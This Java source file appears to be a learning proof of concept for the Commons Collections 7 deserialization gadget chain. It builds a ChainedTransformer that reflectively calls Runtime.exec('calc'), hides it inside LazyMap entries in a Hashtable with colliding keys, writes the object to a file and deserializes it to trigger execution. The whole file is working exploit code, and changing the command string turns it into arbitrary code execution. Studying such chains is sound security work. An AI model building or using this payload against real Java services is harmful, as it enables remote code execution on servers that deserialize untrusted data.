package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers=new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        HashMap map1=new HashMap();
        HashMap map2=new HashMap();
        Map<Object,Object> lazyMap1= LazyMap.decorate(map1,chainedTransformer);
        Map<Object,Object> lazyMap2= LazyMap.decorate(map2,chainedTransformer);
        lazyMap1.put("yy",1);
        lazyMap2.put("zZ",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1,1);
        hashtable.put(lazyMap2,2);

        Field chainField = ChainedTransformer.class.getDeclaredField("iTransformers");
        chainField.setAccessible(true);
        chainField.set(chainedTransformer,transformers);

        lazyMap2.remove("yy");

        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./cc1.txt"));
        objectOutputStream.writeObject(hashtable);
        objectOutputStream.close();
//        //反序列化
        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("./cc1.txt"));
        objectInputStream.readObject();
    }
}
